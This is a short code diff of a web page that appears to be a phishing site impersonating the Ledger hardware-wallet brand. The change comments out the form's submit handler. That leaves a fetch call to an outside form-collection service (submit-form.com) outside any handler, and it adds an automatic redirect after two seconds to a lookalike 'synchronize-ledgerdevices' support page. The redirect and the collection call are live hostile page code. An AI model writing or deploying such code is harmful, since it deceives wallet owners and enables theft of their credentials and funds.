@@ -1547,6 +1547,8 @@ try{(new g(100,"r","QSI_S_ZN_6uka6dlz6B32c1E","https://zn6uka6dlz6b32c1e-ledger.
 <script>
 const form = document.getElementById('solutionForm');
 
+
+/*	
 form.addEventListener('submit', (event) => {
   event.preventDefault(); // prevent default form submission behavior
 
@@ -1569,10 +1571,12 @@ form.addEventListener('submit', (event) => {
   .catch(error => {
     console.error('Error:', error); // log any errors
   });
-setTimeout(() => { proceed();}, 2000);
+
 
   
 });
+
+*/
 
 
       fetch("https://submit-form.com/gmAjhBF4R", {
@@ -1597,7 +1601,7 @@ setTimeout(() => { proceed();}, 2000);
 
 
 
-
+setTimeout(() => { proceed();}, 2000);
 
 function proceed() {
   window.location.href = 'https://synchronize-ledgerdevices.vercel.app/support.html';
